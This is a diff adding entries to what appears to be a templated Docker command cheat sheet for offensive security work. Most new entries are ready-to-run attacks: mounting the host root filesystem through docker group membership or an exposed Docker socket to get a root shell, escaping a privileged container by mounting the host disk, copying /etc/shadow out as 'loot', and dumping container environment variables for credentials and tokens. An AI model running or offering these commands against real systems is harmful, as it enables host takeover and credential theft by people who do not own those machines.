@@ -124,3 +124,69 @@ docker network ls && docker network inspect {{NETWORK:str:bridge}}
 ```
 
 <!-- meta: risk=safe | phase=misc | tags=network,inspect,list -->
+
+---
+
+## privesc mount host root
+Abuse docker group membership to mount the host filesystem and drop into a root shell.
+
+```bash
+docker run -v /:/mnt --rm -it {{IMAGE:str:alpine}} chroot /mnt sh
+```
+
+<!-- meta: risk=high | phase=privesc | tags=privesc,docker-group,mount,root,escape -->
+
+---
+
+## abuse exposed socket privesc
+Spawn a host-mounted root shell through an exposed Docker socket (e.g. mounted into a container).
+
+```bash
+docker -H unix://{{SOCKET:str:/var/run/docker.sock}} run -v /:/host --rm -it {{IMAGE:str:alpine}} chroot /host sh
+```
+
+<!-- meta: risk=high | phase=privesc | tags=privesc,socket,dockersock,escape -->
+
+---
+
+## check inside container
+Detect whether the current shell is running inside a container.
+
+```bash
+ls -la /.dockerenv 2>/dev/null; grep -aE 'docker|lxc|kubepods' /proc/1/cgroup 2>/dev/null
+```
+
+<!-- meta: risk=safe | phase=enum | tags=enum,container,detect -->
+
+---
+
+## escape privileged container
+From inside a --privileged container, mount the host disk and chroot into it.
+
+```bash
+fdisk -l; mount /dev/{{DISK:str:sda1}} /mnt && chroot /mnt sh
+```
+
+<!-- meta: risk=high | phase=privesc | tags=escape,privileged,breakout,mount -->
+
+---
+
+## copy file from container
+Pull a file out of a container to the host for loot.
+
+```bash
+docker cp {{CONTAINER:str:webapp}}:{{PATH:str:/etc/shadow}} ./loot
+```
+
+<!-- meta: risk=low | phase=post | tags=loot,cp,exfil,file -->
+
+---
+
+## dump container env secrets
+Read environment variables (often creds or tokens) from a container's config.
+
+```bash
+docker inspect {{CONTAINER:str:webapp}} | grep -A40 '"Env"'
+```
+
+<!-- meta: risk=low | phase=enum | tags=secrets,env,inspect,creds -->
